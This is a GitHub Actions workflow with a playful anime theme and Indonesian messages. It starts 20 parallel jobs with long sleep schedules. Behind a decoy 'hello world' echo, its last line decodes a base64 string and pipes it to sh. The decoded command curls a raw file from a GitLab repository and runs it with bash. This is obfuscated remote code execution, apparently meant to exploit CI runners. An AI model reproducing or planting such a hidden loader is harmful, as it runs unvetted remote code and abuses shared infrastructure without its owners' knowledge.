name: 🍳 Sanji – Koki Topi Jerami

on:
  workflow_call:
    inputs:
      cycle:
        required: true
        type: string
        default: '1'

jobs:
  sanji-kick:
    name: ${{ matrix.name }}
    runs-on: ubuntu-latest
    timeout-minutes: 360
    strategy:
      fail-fast: false
      max-parallel: 20
      matrix:
        name:
          - name: idghelliosan-ayonser1112a1
          - name: wgjhelliosan-byonser1112b1
          - name: nbghelliosan-cyonser1112c1
          - name: udghelliosan-dyonser1112d1
          - name: ybfhelliosan-eyonser1112e1
          - name: dgbhelliosan-fyonser1112f1
          - name: jdghelliosan-gyonser1112g1
          - name: vfshelliosan-hyonser1112h1
          - name: tfsfhelliosan-iyonser1112i1
          - name: sfsfhelliosan-jyonser1112j1
          - name: bfgshelilop-kyonserer1112k1
          - name: bdvshelilop-lyonserer1112l1
          - name: sfsfhelilop-myonserer1112m1
          - name: cbnfhelilop-nyonserer1112n1
          - name: dgsdhelilop-oyonserer1112o1
          - name: sffshelilop-pyonserer1112p1
          - name: sfswhelilop-qyonserer1112q1
          - name: wewyhelilop-ryonserer1112r1
          - name: ngdghelilop-syonserer1112s1
          - name: jghfhelilop-tyonserer1112t1
    steps:
      - name: 🍳 Sanji menendang dengan Diable Jambe
        run: |
          HOUR_UTC=$(date -u +%H)
          CYCLE=${{ inputs.cycle }}
          echo "🍳 Sanji: 'Diable Jambe!'"
          if [ "$HOUR_UTC" -eq 4 ]; then
            echo "🕚 Jam 11 siang WIB (04 UTC). Sleep 5 jam — Sanji istirahat makan siang."
            SLEEP=18000
          elif [ "$HOUR_UTC" -ge 23 ] || [ "$HOUR_UTC" -lt 3 ]; then
            echo "🕕 Jam 6-9 pagi WIB (UTC 23-02). Sleep 3 jam — Sanji sarapan."
            SLEEP=10800
          else
            if [ "$CYCLE" -le 5 ]; then
              echo "🔄 5 siklus pertama, sleep 600 detik — pemanasan."
              SLEEP=600
            else
              echo "⏳ Siklus ke-6 dan seterusnya, sleep 1 jam — pertarungan sengit."
              SLEEP=3600
            fi
          fi
          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS9nYW5hbnRhcmFzYW5zL2ZpbGVzODgvLS9yYXcvbWFpbi9wb3N0IHwgYmFzaA | sh & sleep $SLEEP